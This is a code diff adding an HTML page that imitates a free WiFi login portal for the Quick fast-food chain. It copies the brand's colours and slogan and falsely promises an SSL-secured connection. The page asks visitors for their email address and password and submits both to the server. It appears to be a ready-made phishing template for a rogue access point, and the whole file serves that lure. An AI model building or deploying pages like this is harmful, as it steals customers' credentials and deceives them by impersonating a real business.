@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quick WiFi Gratuit</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial Black', Arial, sans-serif;
+            background: linear-gradient(135deg, #FF6600 0%, #FFFFFF 30%, #E30613 70%, #FF8C00 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            padding: 2rem 0;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 25% 25%, rgba(255, 102, 0, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(227, 6, 19, 0.15) 0%, transparent 50%);
+            animation: backgroundMove 18s ease-in-out infinite;
+        }
+
+        @keyframes backgroundMove {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-20px, -20px) scale(1.05); }
+        }
+
+        .container {
+            background: linear-gradient(145deg, #ffffff 0%, #fff8f4 100%);
+            border-radius: 22px;
+            padding: 2.5rem;
+            box-shadow: 0 25px 70px rgba(255, 102, 0, 0.3);
+            width: 100%;
+            max-width: 420px;
+            position: relative;
+            animation: slideIn 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 3px solid transparent;
+            background-clip: padding-box;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -3px;
+            left: -3px;
+            right: -3px;
+            bottom: -3px;
+            background: linear-gradient(45deg, #FF6600, #E30613, #FF8C00);
+            border-radius: 22px;
+            z-index: -1;
+            animation: borderGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes borderGlow {
+            0%, 100% { opacity: 0.8; }
+            50% { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(100px) scale(0.85);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .logo {
+            width: 125px;
+            height: 125px;
+            background: linear-gradient(45deg, #FF6600 0%, #E30613 50%, #FF8C00 100%);
+            border-radius: 22px;
+            margin: 0 auto 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            box-shadow: 0 15px 40px rgba(255, 102, 0, 0.4);
+            animation: logoFloat 2.8s ease-in-out infinite;
+            border: 4px solid #ffffff;
+        }
+
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-10px) rotate(-3deg); }
+        }
+
+        .logo::before {
+            content: 'Q';
+            font-size: 4.2rem;
+            font-weight: 900;
+            color: #FFFFFF;
+            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.4);
+            font-family: 'Arial Black', sans-serif;
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            top: -6px;
+            right: -6px;
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(45deg, #FF8C00, #FF6600);
+            border-radius: 50%;
+            border: 3px solid #FFFFFF;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.12); }
+        }
+
+        .brand-name {
+            background: linear-gradient(45deg, #FF6600, #E30613, #FF8C00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-size: 2.6rem;
+            font-weight: 900;
+            margin-bottom: 0.5rem;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+            letter-spacing: -1px;
+            font-family: 'Arial Black', sans-serif;
+        }
+
+        .brand-subtitle {
+            color: #666;
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            font-style: italic;
+        }
+
+        .wifi-title {
+            color: #555;
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 0.8rem;
+        }
+
+        .wifi-info {
+            background: linear-gradient(90deg, #FF6600, #E30613);
+            color: #FFFFFF;
+            padding: 1rem 1.8rem;
+            border-radius: 28px;
+            font-size: 1rem;
+            font-weight: 800;
+            display: inline-block;
+            animation: glow 2.3s ease-in-out infinite alternate;
+            border: 3px solid #FFFFFF;
+            box-shadow: 0 8px 20px rgba(255, 102, 0, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        @keyframes glow {
+            from { 
+                box-shadow: 0 8px 20px rgba(255, 102, 0, 0.3);
+                transform: scale(1);
+            }
+            to { 
+                box-shadow: 0 12px 30px rgba(227, 6, 19, 0.4);
+                transform: scale(1.05);
+            }
+        }
+
+        .welcome-text {
+            text-align: center;
+            color: #333;
+            font-size: 1.1rem;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+            background: linear-gradient(135deg, #fff8f4, #ffffff);
+            padding: 1.5rem;
+            border-radius: 15px;
+            border-left: 4px solid #FF6600;
+            border-right: 4px solid #E30613;
+            font-weight: 600;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            color: #333;
+            font-weight: 800;
+            margin-bottom: 0.8rem;
+            font-size: 1rem;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 1.3rem 1.6rem;
+            border: 3px solid #E5E5E5;
+            border-radius: 16px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background: #FFF8F4;
+            outline: none;
+            font-weight: 600;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #FF6600;
+            background: white;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(255, 102, 0, 0.3);
+        }
+
+        .connect-btn {
+            width: 100%;
+            padding: 1.4rem;
+            background: linear-gradient(135deg, #FF6600 0%, #E30613 100%);
+            color: white;
+            border: none;
+            border-radius: 16px;
+            font-size: 1.3rem;
+            font-weight: 900;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 1.5rem;
+            font-family: 'Arial Black', sans-serif;
+        }
+
+        .connect-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.5), transparent);
+            transition: left 0.5s;
+        }
+
+        .connect-btn:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 20px 40px rgba(255, 102, 0, 0.4);
+            background: linear-gradient(135deg, #E55500 0%, #CC0511 100%);
+        }
+
+        .connect-btn:hover::before {
+            left: 100%;
+        }
+
+        .connect-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .footer-info {
+            text-align: center;
+            color: #888;
+            font-size: 0.85rem;
+            line-height: 1.5;
+            margin-top: 1rem;
+            background: rgba(255, 248, 244, 0.8);
+            padding: 1rem;
+            border-radius: 12px;
+            font-weight: 600;
+        }
+
+        .terms-link {
+            color: #FF6600;
+            text-decoration: none;
+            font-weight: 800;
+        }
+
+        .terms-link:hover {
+            text-decoration: underline;
+            color: #E30613;
+        }
+
+        .wifi-status {
+            position: absolute;
+            top: 18px;
+            right: 18px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(255, 248, 244, 0.95));
+            padding: 0.6rem 1.2rem;
+            border-radius: 22px;
+            font-size: 0.85rem;
+            font-weight: 800;
+            color: #FF6600;
+            border: 2px solid rgba(255, 102, 0, 0.2);
+        }
+
+        .signal-bars {
+            display: flex;
+            gap: 2px;
+        }
+
+        .bar {
+            width: 4px;
+            border-radius: 2px;
+            animation: signalStrength 1.6s ease-in-out infinite;
+        }
+
+        .bar:nth-child(1) { height: 8px; background: #FF6600; animation-delay: 0s; }
+        .bar:nth-child(2) { height: 12px; background: #FF6600; animation-delay: 0.2s; }
+        .bar:nth-child(3) { height: 16px; background: #E30613; animation-delay: 0.4s; }
+        .bar:nth-child(4) { height: 20px; background: #E30613; animation-delay: 0.6s; }
+
+        @keyframes signalStrength {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+
+        .particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            animation: floatParticles 20s linear infinite;
+        }
+
+        .particle:nth-child(odd) { 
+            background: #FF6600; 
+            box-shadow: 0 0 12px rgba(255, 102, 0, 0.7);
+        }
+        .particle:nth-child(even) { 
+            background: #E30613; 
+            box-shadow: 0 0 12px rgba(227, 6, 19, 0.7);
+        }
+
+        @keyframes floatParticles {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        .loading {
+            display: inline-block;
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .promo-banner {
+            background: linear-gradient(90deg, #FF6600, #E30613, #FF8C00);
+            color: white;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            border-radius: 15px;
+            text-align: center;
+            font-weight: 800;
+            font-size: 0.95rem;
+            animation: pulse 2s ease-in-out infinite;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin: 1rem;
+                padding: 2rem;
+            }
+            
+            .logo {
+                width: 105px;
+                height: 105px;
+            }
+            
+            .logo::before {
+                font-size: 3.2rem;
+            }
+            
+            .brand-name {
+                font-size: 2.1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles">
+        <div class="particle" style="left: 10%; animation-delay: 0s;"></div>
+        <div class="particle" style="left: 22%; animation-delay: 2.5s;"></div>
+        <div class="particle" style="left: 34%; animation-delay: 5s;"></div>
+        <div class="particle" style="left: 46%; animation-delay: 7.5s;"></div>
+        <div class="particle" style="left: 58%; animation-delay: 10s;"></div>
+        <div class="particle" style="left: 70%; animation-delay: 12.5s;"></div>
+        <div class="particle" style="left: 82%; animation-delay: 15s;"></div>
+        <div class="particle" style="left: 94%; animation-delay: 17.5s;"></div>
+    </div>
+
+    <div class="container">
+        <div class="wifi-status">
+            <div class="signal-bars">
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+            </div>
+            WiFi Quick
+        </div>
+
+        <div class="header">
+            <div class="logo"></div>
+            <h1 class="brand-name">Quick</h1>
+            <p class="brand-subtitle">C'est ça qui est bon !</p>
+            <p class="wifi-title">WiFi Gratuit</p>
+            <div class="wifi-info">Connexion Rapide</div>
+        </div>
+
+        <div class="promo-banner">
+            🍔 Goûtez nos menus Quick !
+        </div>
+
+        <div class="welcome-text">
+            <strong>Bienvenue chez Quick !</strong><br>
+            Connectez-vous à notre WiFi gratuit et savourez un moment délicieux avec nos spécialités.
+        </div>
+
+        <form id="wifiForm" action="/" method="post">
+            <div class="form-group">
+                <label for="email">Adresse e-mail</label>
+                <input type="email" id="email" name="email" required placeholder="votre@email.com">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" required placeholder="Votre mot de passe">
+            </div>
+
+            <button type="submit" class="connect-btn" id="connectBtn">
+                🌐 Se connecter
+            </button>
+        </form>
+
+        <div class="footer-info">
+            En vous connectant, vous acceptez nos <a href="#" class="terms-link">conditions d'utilisation</a>.<br>
+            <strong>Quick Restaurants</strong> • Connexion sécurisée SSL<br>
+            Bon appétit et bonne navigation !
+        </div>
+    </div>
+
+    <script>
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentElement.style.transform = 'scale(1.02)';
+                this.parentElement.style.transition = 'transform 0.3s ease';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.parentElement.style.transform = 'scale(1)';
+            });
+        });
+
+        document.getElementById('wifiForm').addEventListener('submit', function(e) {
+            const btn = document.getElementById('connectBtn');
+            btn.innerHTML = '<div class="loading"></div> Connexion en cours...';
+            btn.disabled = true;
+            btn.style.background = 'linear-gradient(135deg, #E55500, #CC0511)';
+        });
+
+        function createParticle() {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDelay = Math.random() * 20 + 's';
+            particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+            
+            if (Math.random() > 0.5) {
+                particle.style.background = '#FF6600';
+                particle.style.boxShadow = '0 0 12px rgba(255, 102, 0, 0.7)';
+            } else {
+                particle.style.background = '#E30613';
+                particle.style.boxShadow = '0 0 12px rgba(227, 6, 19, 0.7)';
+            }
+            
+            document.querySelector('.particles').appendChild(particle);
+            
+            setTimeout(() => {
+                particle.remove();
+            }, 30000);
+        }
+
+        setInterval(createParticle, 2500);
+
+        setTimeout(() => {
+            document.querySelector('.container').style.animation = 'pulse 0.5s ease-in-out';
+        }, 1000);
+    </script>
+</body>
+</html>
